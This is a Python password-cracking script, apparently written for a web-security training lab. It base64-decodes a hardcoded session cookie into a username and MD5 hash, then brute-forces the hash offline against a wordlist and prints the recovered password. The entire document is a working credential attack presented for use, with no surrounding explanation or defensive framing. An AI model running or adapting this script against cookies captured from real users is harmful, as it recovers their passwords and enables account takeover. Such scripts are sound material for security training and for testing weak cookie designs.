import base64
import hashlib
import sys
import os

# ===============================
# CONFIG
# ===============================
COOKIE = "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw"
WORDLIST = "passwords.txt"

# ===============================
# DECODE COOKIE
# ===============================
print("[*] Decoding cookie...")

decoded = base64.b64decode(COOKIE).decode()
username, target_hash = decoded.split(":")

print(f"[+] Username : {username}")
print(f"[+] Hash     : {target_hash}")
print()

# ===============================
# CRACK HASH
# ===============================
if not os.path.exists(WORDLIST):
    print("[!] passwords.txt not found!")
    sys.exit(1)

print("[*] Starting offline crack...\n")

with open(WORDLIST, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        hashed = hashlib.md5(password.encode()).hexdigest()

        if hashed == target_hash:
            print("====================================")
            print("[✔] PASSWORD FOUND!")
            print(f"[+] Username : {username}")
            print(f"[+] Password : {password}")
            print("====================================")
            sys.exit(0)

print("[-] Password not found in wordlist.")
